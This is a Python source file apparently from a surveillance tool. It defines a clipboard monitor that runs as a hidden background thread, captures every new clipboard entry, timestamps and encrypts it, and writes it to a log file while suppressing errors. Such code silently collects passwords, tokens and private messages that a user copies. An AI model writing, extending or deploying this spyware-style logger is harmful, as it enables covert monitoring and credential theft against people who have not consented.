import time
import pyperclip
import logger
import threading

def start_clipboard_monitor(cipher, interval=1):
    """
    Starts monitoring the clipboard for changes.
    Any new clipboard content will be timestamped, encrypted,
    and saved to logs/clipboard.bin.
    """

    last_content = ""  # store last seen clipboard text

    def monitor():
        nonlocal last_content
        while True:
            try:
                current = pyperclip.paste()
                # Only log when content changes and is non-empty
                if current and current != last_content:
                    entry = logger.timestamped_bytes("CLIP", current.encode(errors="ignore"))
                    logger.encrypt_and_write(entry, "clipboard.bin", cipher)
                    last_content = current
            except Exception as e:
                # Optional: log error to a separate file
                pass
            time.sleep(interval)

    t = threading.Thread(target=monitor, daemon=True)
    t.start()
    return t
